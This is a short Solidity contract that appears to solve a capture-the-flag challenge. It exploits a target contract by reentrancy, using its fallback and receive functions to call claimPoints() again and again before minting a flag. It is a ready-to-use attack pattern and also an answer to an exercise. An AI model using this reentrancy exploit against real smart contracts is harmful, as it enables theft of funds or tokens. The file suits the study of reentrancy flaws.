//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge5 {
    function claimPoints() external;

    function mintFlag() external;
}

contract Challenge5Solution {
    address public target;
    bool private inClaim;
    uint256 public remaining;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        require(!inClaim, "busy");
        inClaim = true;
        remaining = 10;
        IChallenge5(target).claimPoints();
        inClaim = false;
        IChallenge5(target).mintFlag();
    }

    function _reenter() internal {
        // reenter until remaining points reached
        if (inClaim && remaining > 1) {
            remaining -= 1;
            IChallenge5(target).claimPoints();
        }
    }

    fallback() external payable {
        _reenter();
    }

    receive() external payable {
        _reenter();
    }
}
